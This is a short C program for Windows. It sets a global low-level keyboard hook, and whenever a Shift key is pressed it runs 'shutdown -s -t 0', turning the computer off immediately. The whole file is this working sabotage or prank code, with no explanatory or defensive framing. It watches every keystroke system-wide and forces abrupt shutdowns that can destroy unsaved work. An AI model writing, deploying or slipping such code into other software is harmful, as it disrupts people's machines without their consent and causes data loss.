#include <stdio.h>
#include <windows.h>
#include <lmcons.h>

LRESULT CALLBACK keyboard_callback(int, WPARAM, LPARAM);

int main() {
    // Set up the keyboard hook
    HHOOK keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_callback, NULL, 0);

    // Start the message loop
    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        DispatchMessageW(&message);
    }

    // Remove the keyboard hook and exit the program
    UnhookWindowsHookEx(keyboard_hook);
    return 0;
}



// Callback function for keyboard events
LRESULT CALLBACK keyboard_callback(int code, WPARAM wparam, LPARAM lparam) {
    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lparam;
   
    //if keypress is dected and key is down
    if (code == HC_ACTION && wparam == WM_KEYDOWN) {
        //if key is left/right shift key
        if (key->vkCode == VK_RSHIFT || key->vkCode == VK_LSHIFT) {
            //runs system shutdown
            system("C:\\WINDOWS\\System32\\shutdown -s -t 0"); 
        }
    }
  
    return CallNextHookEx(NULL, code, wparam, lparam);
}
